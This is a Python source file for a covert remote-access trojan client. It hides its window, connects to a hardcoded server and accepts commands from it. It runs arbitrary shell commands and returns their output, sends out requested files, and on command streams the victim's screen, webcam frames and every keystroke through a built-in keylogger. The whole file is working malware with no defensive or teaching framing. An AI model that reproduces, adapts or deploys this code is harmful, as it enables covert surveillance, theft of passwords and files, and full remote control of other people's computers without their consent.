import sys
import os
import socket
import subprocess
from PyQt5.QtWidgets import QApplication, QWidget
from PyQt5.QtCore import QThread, QBuffer
from PyQt5.QtGui import QImage
import cv2

SERVER_IP = '10.0.1.33'
SERVER_PORT = 9999

class Client(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.hide()
        self.connect_to_server()

    def initUI(self):
        # Initialize UI components if needed
        pass

    def connect_to_server(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((SERVER_IP, SERVER_PORT))
        self.receive_thread = ReceiveThread(self.s)
        self.receive_thread.start()

class ReceiveThread(QThread):
    def __init__(self, sock):
        QThread.__init__(self)
        self.sock = sock

    def run(self):
        while True:
            data = self.sock.recv(1024).decode()
            if data:
                self.handle_command(data)

    def handle_command(self, command):
        if command == '!stream':
            self.start_stream()
        elif command.startswith('!download'):
            self.download_file(command.split(' ')[1])
        else:
            output = self.execute_command(command)
            self.sock.send(output.encode())

    def start_stream(self):
        screen_thread = ScreenShareThread(self.sock)
        screen_thread.start()
        webcam_thread = WebcamShareThread(self.sock)
        webcam_thread.start()
        keylogger_thread = KeyloggerThread(self.sock)
        keylogger_thread.start()

    def execute_command(self, command):
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout

    def download_file(self, filepath):
        try:
            with open(filepath, 'rb') as file:
                self.sock.sendall(file.read())
        except Exception as e:
            self.sock.send(str(e).encode())

class ScreenShareThread(QThread):
    def __init__(self, sock):
        QThread.__init__(self)
        self.sock = sock

    def run(self):
        while True:
            screen = self.capture_screen()
            self.sock.sendall(screen)

    def capture_screen(self):
        screenshot = QApplication.primaryScreen().grabWindow(0).toImage()
        buffer = QBuffer()
        buffer.open(QBuffer.ReadWrite)
        screenshot.save(buffer, 'PNG')
        return buffer.data()

class WebcamShareThread(QThread):
    def __init__(self, sock):
        QThread.__init__(self)
        self.sock = sock
        self.cap = cv2.VideoCapture(0)

    def run(self):
        while True:
            ret, frame = self.cap.read()
            if ret:
                self.send_frame(frame)

    def send_frame(self, frame):
        _, buffer = cv2.imencode('.jpg', frame)
        self.sock.sendall(buffer.tobytes())

class KeyloggerThread(QThread):
    def __init__(self, sock):
        QThread.__init__(self)
        self.sock = sock

    def run(self):
        from pynput import keyboard

        def on_press(key):
            self.sock.sendall(str(key).encode())

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    client = Client()
    sys.exit(app.exec_())
